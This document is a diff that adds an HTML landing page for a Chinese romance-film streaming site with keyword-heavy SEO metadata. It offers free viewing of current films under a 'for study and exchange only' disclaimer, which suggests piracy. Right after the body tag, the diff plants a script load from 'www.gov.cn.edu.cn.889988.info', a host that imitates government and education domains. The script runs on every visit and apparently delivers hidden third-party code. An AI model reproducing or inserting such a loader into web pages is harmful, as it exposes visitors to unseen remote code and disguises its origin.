@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="情话电影网（qinghuadianyingwang-h5）是专业的电影在线观看平台，提供最新电影、热播电视剧、综艺动漫等高清影视资源免费观看，涵盖爱情、浪漫、文艺等多种类型，网址 https://qinghuadianyingwang-h5.github.io。">
+<meta name="keywords" content="情话电影网,qinghuadianyingwang-h5,电影在线观看,免费电影,高清电影,热播电视剧,浪漫爱情电影,影视资源">
+<meta name="author" content="情话电影网">
+<meta name="robots" content="index,follow">
+<meta property="og:title" content="情话电影网 - 浪漫影视在线观看平台">
+<meta property="og:description" content="情话电影网（qinghuadianyingwang-h5）提供最新电影、热播电视剧、综艺动漫等高清影视资源免费观看。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://qinghuadianyingwang-h5.github.io">
+<link rel="canonical" href="https://qinghuadianyingwang-h5.github.io">
+<title>情话电影网 - 浪漫影视在线观看平台 | qinghuadianyingwang-h5.github.io</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --rose:#e91e8c;--pink:#ff6fa8;--deep:#2b1633;--deeper:#1a0d22;
+  --card:#3a2147;--text:#f8eaf2;--muted:#c9a8c4;--gold:#ffd54f;
+  --grad:linear-gradient(135deg,#e91e8c 0%,#ff6fa8 55%,#c2187a 100%);
+  --soft:linear-gradient(135deg,rgba(233,30,140,.16),rgba(255,111,168,.08));
+}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Helvetica Neue",Arial,sans-serif;
+  background:var(--deeper);color:var(--text);line-height:1.7;
+  overflow-x:hidden;
+}
+a{text-decoration:none;color:inherit}
+
+/* ---------- HEADER ---------- */
+header{
+  position:fixed;top:0;left:0;width:100%;z-index:100;
+  background:rgba(26,13,34,.82);backdrop-filter:blur(14px);
+  border-bottom:1px solid rgba(233,30,140,.25);
+  transition:.35s;
+}
+.header-inner{max-width:1180px;margin:0 auto;padding:12px 24px;display:flex;align-items:center;justify-content:space-between}
+.logo{display:flex;align-items:center;gap:11px;font-size:22px;font-weight:800;letter-spacing:.5px}
+.logo-icon{
+  width:42px;height:42px;border-radius:13px;display:grid;place-items:center;
+  font-size:22px;background:var(--grad);box-shadow:0 5px 18px rgba(233,30,140,.45);
+}
+.logo span{background:var(--grad);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+nav{display:flex;align-items:center;gap:6px}
+nav a{
+  padding:8px 15px;border-radius:20px;font-size:15px;color:var(--muted);
+  transition:.3s;white-space:nowrap;
+}
+nav a:hover{color:#fff;background:rgba(233,30,140,.22)}
+.hamburger{display:none;flex-direction:column;gap:5px;cursor:pointer;padding:6px}
+.hamburger i{width:25px;height:2.5px;background:var(--pink);border-radius:3px;transition:.3s}
+
+/* ---------- HERO ---------- */
+.hero{
+  margin-top:68px;position:relative;padding:90px 24px 80px;text-align:center;
+  background:
+    radial-gradient(circle at 18% 30%,rgba(233,30,140,.32),transparent 45%),
+    radial-gradient(circle at 82% 70%,rgba(194,24,122,.28),transparent 45%),
+    linear-gradient(180deg,#2b1633,#1a0d22);
+  overflow:hidden;
+}
+.hero::before{
+  content:"";position:absolute;inset:0;
+  background-image:
+    radial-gradient(circle at 12px 12px,rgba(255,255,255,.05) 1.5px,transparent 1.5px);
+  background-size:38px 38px;opacity:.5;
+}
+.hero-inner{position:relative;max-width:780px;margin:0 auto}
+.badge{
+  display:inline-flex;align-items:center;gap:7px;padding:7px 18px;border-radius:30px;
+  background:var(--soft);border:1px solid rgba(233,30,140,.4);
+  font-size:13.5px;color:#ffcfe4;margin-bottom:24px;
+}
+.badge b{color:var(--gold)}
+.hero h1{
+  font-size:52px;font-weight:900;line-height:1.2;margin-bottom:20px;
+  background:linear-gradient(90deg,#fff 10%,#ff8fc0 55%,#e91e8c 100%);
+  -webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;
+}
+.hero h1 small{display:block;font-size:19px;font-weight:500;letter-spacing:4px;margin-top:14px;color:var(--muted);-webkit-text-fill-color:var(--muted)}
+.hero p{font-size:17px;color:var(--muted);max-width:600px;margin:0 auto 34px}
+.hero-actions{display:flex;gap:16px;justify-content:center;flex-wrap:wrap}
+.btn{
+  padding:14px 34px;border-radius:40px;font-size:16px;font-weight:700;
+  cursor:pointer;border:none;transition:.35s;display:inline-flex;align-items:center;gap:8px;
+}
+.btn-primary{background:var(--grad);color:#fff;box-shadow:0 8px 28px rgba(233,30,140,.5)}
+.btn-primary:hover{transform:translateY(-3px);box-shadow:0 14px 40px rgba(233,30,140,.6)}
+.btn-ghost{background:transparent;color:#fff;border:2px solid rgba(255,111,168,.55)}
+.btn-ghost:hover{border-color:var(--pink);background:rgba(233,30,140,.18)}
+.stats{display:flex;gap:50px;justify-content:center;margin-top:56px;flex-wrap:wrap;position:relative}
+.stat-num{font-size:38px;font-weight:900;background:var(--grad);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+.stat-label{font-size:14px;color:var(--muted);margin-top:2px}
+
+/* ---------- SECTION ---------- */
+section{padding:72px 24px;max-width:1180px;margin:0 auto}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:20px;margin-bottom:40px;flex-wrap:wrap}
+.sec-title{display:flex;align-items:center;gap:14px}
+.sec-line{width:6px;height:34px;border-radius:4px;background:var(--grad)}
+.sec-head h2{font-size:29px;font-weight:800;letter-spacing:.5px}
+.sec-head h2 em{font-style:normal;color:var(--pink)}
+.sec-more{font-size:14px;color:var(--muted);border-bottom:1px dashed rgba(255,111,168,.4);padding-bottom:2px;transition:.3s}
+.sec-more:hover{color:var(--pink)}
+
+/* ---------- MOVIE GRID ---------- */
+.grid{display:grid;grid-template-columns:repeat(5,1fr);gap:22px}
+.card{
+  background:var(--card);border-radius:16px;overflow:hidden;
+  border:1px solid rgba(255,111,168,.14);transition:.4s;position:relative;
+}
+.card:hover{transform:translateY(-8px);border-color:rgba(233,30,140,.6);box-shadow:0 18px 44px rgba(233,30,140,.28)}
+.card-poster{
+  position:relative;height:250px;display:grid;place-items:center;
+  font-size:46px;background:var(--soft);
+}
+.card-poster::after{
+  content:"";position:absolute;inset:0;
+  background:linear-gradient(180deg,transparent 45%,rgba(26,13,34,.92));
+}
+.card-tag{
+  position:absolute;top:11px;left:11px;z-index:2;
+  padding:4px 11px;border-radius:20px;font-size:11.5px;font-weight:700;
+  background:var(--grad);color:#fff;box-shadow:0 3px 10px rgba(233,30,140,.4);
+}
+.card-score{
+  position:absolute;top:11px;right:11px;z-index:2;
+  padding:4px 10px;border-radius:20px;font-size:12.5px;font-weight:800;color:#2b1633;
+  background:var(--gold);box-shadow:0 3px 10px rgba(255,213,79,.45);
+}
+.card-info{position:relative;padding:0 16px 16px;margin-top:-46px}
+.card-info h3{font-size:16.5px;font-weight:700;margin-bottom:7px}
+.card-info p{font-size:13px;color:var(--muted);display:flex;gap:8px;flex-wrap:wrap}
+.card-info p span{background:rgba(255,255,255,.07);padding:2px 9px;border-radius:12px}
+
+/* ---------- TV GRID (6 cols) ---------- */
+.grid-tv{display:grid;grid-template-columns:repeat(3,1fr);gap:22px}
+.tv-card{
+  background:var(--card);border-radius:18px;overflow:hidden;border:1px solid rgba(255,111,168,.14);
+  display:flex;transition:.4s;
+}
+.tv-card:hover{transform:translateY(-6px);box-shadow:0 16px 40px rgba(233,30,140,.26)}
+.tv-poster{
+  width:120px;flex-shrink:0;display:grid;place-items:center;font-size:40px;
+  background:var(--soft);
+}
+.tv-body{padding:18px 16px;flex:1}
+.tv-body h3{font-size:17px;font-weight:700;margin-bottom:8px}
+.tv-body p{font-size:13px;color:var(--muted);margin-bottom:10px}
+.tv-ep{display:inline-block;padding:4px 12px;border-radius:20px;font-size:12px;font-weight:700;background:var(--grad);color:#fff}
+
+/* ---------- CATEGORY CARDS ---------- */
+.cat-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:22px}
+.cat-card{
+  border-radius:20px;padding:34px 26px;min-height:180px;position:relative;overflow:hidden;
+  transition:.4s;cursor:pointer;display:flex;flex-direction:column;justify-content:space-between;
+}
+.cat-card::before{
+  content:"";position:absolute;right:-30px;top:-30px;width:130px;height:130px;border-radius:50%;
+  background:rgba(255,255,255,.14);
+}
+.cat-card:hover{transform:translateY(-7px) scale(1.02)}
+.cat-emoji{font-size:42px;position:relative;z-index:2}
+.cat-card h3{font-size:21px;font-weight:800;position:relative;z-index:2}
+.cat-card p{font-size:13px;color:rgba(255,255,255,.85);position:relative;z-index:2}
+
+/* ---------- NEWS ---------- */
+.news-wrap{display:grid;grid-template-columns:1.35fr 1fr;gap:26px}
+.news-main{
+  border-radius:18px;padding:30px;background:var(--soft);
+  border:1px solid rgba(233,30,140,.3);
+}
+.news-date{font-size:13px;color:var(--gold);font-weight:700;letter-spacing:1px}
+.news-main h3{font-size:22px;font-weight:800;margin:10px 0 12px}
+.news-main p{color:var(--muted);font-size:14.5px}
+.news-list{display:flex;flex-direction:column;gap:14px}
+.news-item{
+  display:flex;gap:16px;padding:16px;border-radius:14px;background:var(--card);
+  border:1px solid rgba(255,111,168,.12);transition:.35s;
+}
+.news-item:hover{border-color:rgba(233,30,140,.55);background:#43264f}
+.news-day{font-size:26px;font-weight:900;line-height:1;background:var(--grad);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;flex-shrink:0;width:46px}
+.news-item h4{font-size:15.5px;font-weight:700;margin-bottom:5px}
+.news-item span{font-size:12.5px;color:var(--muted)}
+
+/* ---------- ABOUT ---------- */
+.about-box{
+  border-radius:22px;padding:46px;background:var(--soft);
+  border:1px solid rgba(233,30,140,.28);position:relative;overflow:hidden;
+}
+.about-box::after{
+  content:"💕";position:absolute;right:6%;bottom:-20px;font-size:140px;opacity:.12;
+}
+.about-box h2{font-size:30px;font-weight:900;margin-bottom:16px}
+.about-box p{color:var(--muted);font-size:15.5px;max-width:700px;margin-bottom:34px}
+.feat-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:20px;position:relative;z-index:2}
+.feat{text-align:center;padding:24px 14px;border-radius:16px;background:rgba(255,255,255,.05)}
+.feat-ic{font-size:38px;margin-bottom:12px}
+.feat h4{font-size:17px;font-weight:800;margin-bottom:6px}
+.feat p{font-size:13px;color:var(--muted);margin:0}
+
+/* ---------- FOOTER ---------- */
+footer{background:var(--deep);border-top:1px solid rgba(255,111,168,.18);padding:56px 24px 28px}
+.foot-inner{max-width:1180px;margin:0 auto}
+.foot-grid{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:40px;margin-bottom:40px}
+.foot-brand{display:flex;align-items:center;gap:12px;font-size:22px;font-weight:800;margin-bottom:14px}
+.foot-brand .logo-icon{width:44px;height:44px;font-size:23px}
+.foot-col h4{font-size:16px;font-weight:800;margin-bottom:16px;color:#fff}
+.foot-col a{display:block;color:var(--muted);font-size:14px;padding:6px 0;transition:.3s}
+.foot-col a:hover{color:var(--pink);padding-left:6px}
+.foot-bottom{
+  border-top:1px solid rgba(255,111,168,.15);padding-top:24px;
+  text-align:center;color:var(--muted);font-size:13.5px;
+}
+.foot-bottom .site-url{color:var(--pink);font-weight:700}
+
+/* ---------- RESPONSIVE ---------- */
+@media(max-width:1024px){
+  .grid{grid-template-columns:repeat(3,1fr)}
+  .cat-grid{grid-template-columns:repeat(2,1fr)}
+  .feat-grid{grid-template-columns:repeat(2,1fr)}
+  .foot-grid{grid-template-columns:repeat(2,1fr)}
+  .news-wrap{grid-template-columns:1fr}
+}
+@media(max-width:768px){
+  .hero{padding:60px 20px 56px}
+  .hero h1{font-size:34px}
+  .hero h1 small{font-size:15px;letter-spacing:2px}
+  .stats{gap:30px;margin-top:40px}
+  .stat-num{font-size:30px}
+  nav{position:fixed;top:68px;right:-100%;flex-direction:column;width:76%;max-width:300px;
+      height:calc(100vh - 68px);background:rgba(26,13,34,.98);backdrop-filter:blur(16px);
+      padding:30px 20px;gap:6px;transition:.45s;box-shadow:-10px 0 40px rgba(0,0,0,.5)}
+  nav.open{right:0}
+  nav a{width:100%;text-align:center;padding:14px;font-size:16px;border-radius:12px}
+  .hamburger{display:flex}
+  .grid{grid-template-columns:repeat(2,1fr);gap:16px}
+  .grid-tv{grid-template-columns:1fr}
+  section{padding:52px 20px}
+  .sec-head h2{font-size:24px}
+  .about-box{padding:32px 24px}
+  .tv-poster{width:96px;font-size:32px}
+}
+@media(max-width:480px){
+  .grid{grid-template-columns:repeat(2,1fr)}
+  .card-poster{height:200px;font-size:36px}
+  .cat-grid{grid-template-columns:1fr}
+  .feat-grid{grid-template-columns:1fr}
+  .foot-grid{grid-template-columns:1fr}
+  .hero-actions .btn{padding:12px 26px;font-size:15px}
+  .stats{gap:22px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- HEADER -->
+<header id="header">
+  <div class="header-inner">
+    <div class="logo">
+      <div class="logo-icon">💗</div>
+      <span>情话电影网</span>
+    </div>
+    <nav id="nav">
+      <a href="#home">首页</a>
+      <a href="#movies">热播电影</a>
+      <a href="#tv">热播电视剧</a>
+      <a href="#cat">综艺动漫</a>
+      <a href="#news">影视资讯</a>
+      <a href="#about">关于我们</a>
+    </nav>
+    <div class="hamburger" id="burger"><i></i><i></i><i></i></div>
+  </div>
+</header>
+
+<!-- HERO -->
+<div class="hero" id="home">
+  <div class="hero-inner">
+    <div class="badge">🎬 情话电影网 · <b>qinghuadianyingwang-h5.github.io</b></div>
+    <h1>用一部好电影，说一句情话<small>情话电影网 · 浪漫影视在线观看平台</small></h1>
+    <p>情话电影网（qinghuadianyingwang-h5）专注爱情、浪漫、文艺与情感类影视资源，免费在线观看最新电影、热播电视剧、综艺动漫，高清流畅，用影像传递每一份心动。</p>
+    <div class="hero-actions">
+      <a class="btn btn-primary" href="#movies">🎞️ 开始观影</a>
+      <a class="btn btn-ghost" href="#about">了解更多</a>
+    </div>
+    <div class="stats">
+      <div><div class="stat-num">12,680+</div><div class="stat-label">影视资源</div></div>
+      <div><div class="stat-num">386</div><div class="stat-label">今日更新</div></div>
+      <div><div class="stat-num">4K</div><div class="stat-label">高清画质</div></div>
+      <div><div class="stat-num">9.6万</div><div class="stat-label">忠实影迷</div></div>
+    </div>
+  </div>
+</div>
+
+<!-- MOVIES -->
+<section id="movies">
+  <div class="sec-head">
+    <div class="sec-title"><div class="sec-line"></div><h2>热播<em>电影</em></h2></div>
+    <a class="sec-more" href="#">查看全部影片 →</a>
+  </div>
+  <div class="grid">
+    <div class="card">
+      <div class="card-poster">💘<span class="card-tag">爱情</span><span class="card-score">9.2</span></div>
+      <div class="card-info"><h3>时光情书</h3><p><span>爱情</span><span>2026</span><span>1080P</span></p></div>
+    </div>
+    <div class="card">
+      <div class="card-poster">🌹<span class="card-tag">浪漫</span><span class="card-score">8.8</span></div>
+      <div class="card-info"><h3>玫瑰余温</h3><p><span>浪漫</span><span>2026</span><span>4K</span></p></div>
+    </div>
+    <div class="card">
+      <div class="card-poster">💑<span class="card-tag">剧情</span><span class="card-score">9.0</span></div>
+      <div class="card-info"><h3>余生有你</h3><p><span>剧情</span><span>2025</span><span>1080P</span></p></div>
+    </div>
+    <div class="card">
+      <div class="card-poster">🌙<span class="card-tag">文艺</span><span class="card-score">8.7</span></div>
+      <div class="card-info"><h3>月光情诗</h3><p><span>文艺</span><span>2025</span><span>蓝光</span></p></div>
+    </div>
+    <div class="card">
+      <div class="card-poster">💍<span class="card-tag">爱情</span><span class="card-score">9.4</span></div>
+      <div class="card-info"><h3>唯一的你</h3><p><span>爱情</span><span>2026</span><span>4K</span></p></div>
+    </div>
+    <div class="card">
+      <div class="card-poster">🕊️<span class="card-tag">治愈</span><span class="card-score">8.9</span></div>
+      <div class="card-info"><h3>再见萤火</h3><p><span>治愈</span><span>2025</span><span>1080P</span></p></div>
+    </div>
+    <div class="card">
+      <div class="card-poster">🌸<span class="card-tag">青春</span><span class="card-score">8.6</span></div>
+      <div class="card-info"><h3>樱花约定</h3><p><span>青春</span><span>2026</span><span>1080P</span></p></div>
+    </div>
+    <div class="card">
+      <div class="card-poster">💫<span class="card-tag">奇幻</span><span class="card-score">8.5</span></div>
+      <div class="card-info"><h3>星辰告白</h3><p><span>奇幻</span><span>2025</span><span>4K</span></p></div>
+    </div>
+    <div class="card">
+      <div class="card-poster">🎻<span class="card-tag">音乐</span><span class="card-score">8.8</span></div>
+      <div class="card-info"><h3>琴键上的爱</h3><p><span>音乐</span><span>2025</span><span>1080P</span></p></div>
+    </div>
+    <div class="card">
+      <div class="card-poster">🌊<span class="card-tag">爱情</span><span class="card-score">9.1</span></div>
+      <div class="card-info"><h3>海风来信</h3><p><span>爱情</span><span>2026</span><span>4K</span></p></div>
+    </div>
+  </div>
+</section>
+
+<!-- TV -->
+<section id="tv">
+  <div class="sec-head">
+    <div class="sec-title"><div class="sec-line"></div><h2>热播<em>电视剧</em></h2></div>
+    <a class="sec-more" href="#">查看全部剧集 →</a>
+  </div>
+  <div class="grid-tv">
+    <div class="tv-card">
+      <div class="tv-poster">💕</div>
+      <div class="tv-body"><h3>余生请多指教</h3><p>都市爱情 · 甜蜜治愈，讲述一段关于成长与守候的故事。</p><span class="tv-ep">更新至 32 集</span></div>
+    </div>
+    <div class="tv-card">
+      <div class="tv-poster">🌷</div>
+      <div class="tv-body"><h3>春日迟迟</h3><p>年代情感 · 跨越时光的爱恋，细腻动人。</p><span class="tv-ep">更新至 24 集</span></div>
+    </div>
+    <div class="tv-card">
+      <div class="tv-poster">🦋</div>
+      <div class="tv-body"><h3>蝴蝶落在心上</h3><p>青春校园 · 纯美初恋，唤醒心底最柔软的回忆。</p><span class="tv-ep">更新至 18 集</span></div>
+    </div>
+    <div class="tv-card">
+      <div class="tv-poster">🌙</div>
+      <div class="tv-body"><h3>今夜月色很美</h3><p>都市浪漫 · 成年人的爱情，温暖而真实。</p><span class="tv-ep">更新至 40 集</span></div>
+    </div>
+    <div class="tv-card">
+      <div class="tv-poster">💌</div>
+      <div class="tv-body"><h3>见信如晤</h3><p>古装情感 · 一封书信牵起的千古情缘。</p><span class="tv-ep">更新至 12 集</span></div>
+    </div>
+    <div class="tv-card">
+      <div class="tv-poster">🍃</div>
+      <div class="tv-body"><h3>风吹半夏</h3><p>现实情感 · 关于梦想、爱情与自我成长。</p><span class="tv-ep">全 36 集</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- CATEGORY -->
+<section id="cat">
+  <div class="sec-head">
+    <div class="sec-title"><div class="sec-line"></div><h2>综艺<em>·动漫</em></h2></div>
+    <a class="sec-more" href="#">浏览全部分类 →</a>
+  </div>
+  <div class="cat-grid">
+    <div class="cat-card" style="background:linear-gradient(135deg,#ff6fa8,#e91e8c)">
+      <div class="cat-emoji">💋</div><div><h3>恋爱综艺</h3><p>甜度超标的心动现场</p></div>
+    </div>
+    <div class="cat-card" style="background:linear-gradient(135deg,#ba68c8,#7b1fa2)">
+      <div class="cat-emoji">🎀</div><div><h3>少女漫改</h3><p>浪漫少女心专属番剧</p></div>
+    </div>
+    <div class="cat-card" style="background:linear-gradient(135deg,#f06292,#c2185b)">
+      <div class="cat-emoji">🎤</div><div><h3>情感访谈</h3><p>真实故事里的爱恨交织</p></div>
+    </div>
+    <div class="cat-card" style="background:linear-gradient(135deg,#ce93d8,#ab47bc)">
+      <div class="cat-emoji">🌈</div><div><h3>治愈动漫</h3><p>温柔到骨子里的日常</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- NEWS -->
+<section id="news">
+  <div class="sec-head">
+    <div class="sec-title"><div class="sec-line"></div><h2>影视<em>资讯</em></h2></div>
+    <a class="sec-more" href="#">更多动态 →</a>
+  </div>
+  <div class="news-wrap">
+    <div class="news-main">
+      <div class="news-date">2026 · 10 · 01</div>
+      <h3>2026 年度浪漫爱情片盘点：哪些电影值得和TA一起看？</h3>
+      <p>情话电影网为你精选 2026 年最具话题度的爱情电影，从初恋悸动到长久陪伴，每一部都藏着一句未说出口的情话。收藏这份片单，和最重要的人一起度过温柔时光。</p>
+    </div>
+    <div class="news-list">
+      <div class="news-item">
+        <div class="news-day">28<br><span style="font-size:12px;color:var(--muted)">09月</span></div>
+        <div><h4>《时光情书》票房破 8 亿，口碑持续走高</h4><span>热播电影 · 爱情片</span></div>
+      </div>
+      <div class="news-item">
+        <div class="news-day">25<br><span style="font-size:12px;color:var(--muted)">09月</span></div>
+        <div><h4>《余生请多指教》今晚更新，甜蜜剧情再升级</h4><span>热播电视剧 · 都市爱情</span></div>
+      </div>
+      <div class="news-item">
+        <div class="news-day">22<br><span style="font-size:12px;color:var(--muted)">09月</span></div>
+        <div><h4>治愈系动漫推荐：三部长片治愈你的疲惫</h4><span>综艺动漫 · 治愈番</span></div>
+      </div>
+      <div class="news-item">
+        <div class="news-day">20<br><span style="font-size:12px;color:var(--muted)">09月</span></div>
+        <div><h4>情话电影网全新升级，4K 高清畅享更流畅</h4><span>平台公告 · 功能更新</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ABOUT -->
+<section id="about">
+  <div class="about-box">
+    <h2>关于 情话电影网</h2>
+    <p>情话电影网（qinghuadianyingwang-h5）是一个专注浪漫与情感类影视内容的在线观看平台，致力于为每一位热爱电影的人提供最新、最全、最清晰的高清影视资源。我们相信，每一部好电影都是一句说给世界的情话，愿这里的每一帧画面，都能温暖你的时光。</p>
+    <div class="feat-grid">
+      <div class="feat"><div class="feat-ic">💗</div><h4>精选片单</h4><p>聚焦爱情与情感类佳作</p></div>
+      <div class="feat"><div class="feat-ic">🎬</div><h4>高清画质</h4><p>4K 蓝光流畅播放</p></div>
+      <div class="feat"><div class="feat-ic">⚡</div><h4>每日更新</h4><p>紧跟院线同步上新</p></div>
+      <div class="feat"><div class="feat-ic">📱</div><h4>多端适配</h4><p>手机电脑随时畅看</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- FOOTER -->
+<footer>
+  <div class="foot-inner">
+    <div class="foot-grid">
+      <div>
+        <div class="foot-brand"><div class="logo-icon">💗</div>情话电影网</div>
+        <p style="color:var(--muted);font-size:14px;max-width:320px">情话电影网（qinghuadianyingwang-h5）—— 用一部好电影，说一句情话。专注爱情、浪漫、文艺与情感类影视资源的在线观看平台。</p>
+      </div>
+      <div class="foot-col">
+        <h4>电影分类</h4>
+        <a href="#">爱情电影</a>
+        <a href="#">浪漫喜剧</a>
+        <a href="#">文艺片</a>
+        <a href="#">青春校园</a>
+      </div>
+      <div class="foot-col">
+        <h4>电视剧集</h4>
+        <a href="#">都市爱情</a>
+        <a href="#">年代情感</a>
+        <a href="#">古装言情</a>
+        <a href="#">治愈系列</a>
+      </div>
+      <div class="foot-col">
+        <h4>关于我们</h4>
+        <a href="#">平台介绍</a>
+        <a href="#">联系方式</a>
+        <a href="#">使用帮助</a>
+        <a href="#">友情链接</a>
+      </div>
+    </div>
+    <div class="foot-bottom">
+      © 2026 情话电影网 qinghuadianyingwang-h5 · 网址：<span class="site-url">https://qinghuadianyingwang-h5.github.io</span> · 本站所有影片资源仅供学习交流
+    </div>
+  </div>
+</footer>
+
+<script>
+  // 汉堡菜单
+  const burger = document.getElementById('burger');
+  const nav = document.getElementById('nav');
+  burger.addEventListener('click', () => nav.classList.toggle('open'));
+  nav.querySelectorAll('a').forEach(a => a.addEventListener('click', () => nav.classList.remove('open')));
+
+  // 滚动头部阴影
+  const header = document.getElementById('header');
+  window.addEventListener('scroll', () => {
+    header.style.background = window.scrollY > 40 ? 'rgba(26,13,34,.96)' : 'rgba(26,13,34,.82)';
+  });
+</script>
+</body>
+</html>
